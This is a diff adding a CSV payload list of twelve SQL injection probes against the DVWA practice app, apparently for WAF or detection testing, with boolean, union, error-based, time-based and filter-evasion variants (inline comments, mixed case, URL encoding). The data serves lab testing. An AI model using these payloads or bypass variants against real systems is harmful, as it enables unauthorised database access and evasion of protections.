@@ -1,0 +1,13 @@
+payload_id,attack_type,attack_subtype,evasion_type,dvwa_endpoint,param,method,payload,expected_baseline_behavior,notes
+SQLI001,sqli,entry_point_detection,single_quote,/vulnerabilities/sqli/,id,GET,',error_or_response_change,Single quote probe to test SQL parser handling
+SQLI002,sqli,boolean_based,basic_or_true,/vulnerabilities/sqli/,id,GET,1 OR 1=1,results_returned,Classic boolean-based SQL injection
+SQLI003,sqli,boolean_based,string_or_true,/vulnerabilities/sqli/,id,GET,' OR '1'='1,results_returned,String-based OR true condition
+SQLI004,sqli,union_based,basic_union,/vulnerabilities/sqli/,id,GET,"1 UNION SELECT 1,2",union_response_or_error,Union SELECT probe for column response behaviour
+SQLI005,sqli,error_based,basic_error,/vulnerabilities/sqli/,id,GET,1',sql_error_or_response_change,Quote-based error probe
+SQLI006,sqli,waf_bypass,no_space_comment,/vulnerabilities/sqli/,id,GET,1/**/OR/**/1=1,results_returned,No-space bypass using inline comments
+SQLI007,sqli,waf_bypass,case_modification,/vulnerabilities/sqli/,id,GET,1 oR 1=1,results_returned,Mixed-case keyword variation
+SQLI008,sqli,waf_bypass,url_encoded,/vulnerabilities/sqli/,id,GET,%27%20OR%20%271%27%3D%271,results_returned,URL-encoded string OR true payload
+SQLI009,sqli,time_based,sleep_probe,/vulnerabilities/sqli/,id,GET,1 AND SLEEP(2),delayed_response_or_blocked,Time-based SQLi probe
+SQLI010,sqli,boolean_based,and_true,/vulnerabilities/sqli/,id,GET,1 AND 1=1,normal_result,Boolean AND true condition
+SQLI011,sqli,boolean_based,and_false,/vulnerabilities/sqli/,id,GET,1 AND 1=2,different_result,Boolean AND false condition
+SQLI012,sqli,waf_bypass,plus_as_space,/vulnerabilities/sqli/,id,GET,1+OR+1=1,results_returned,Plus signs used as encoded spaces
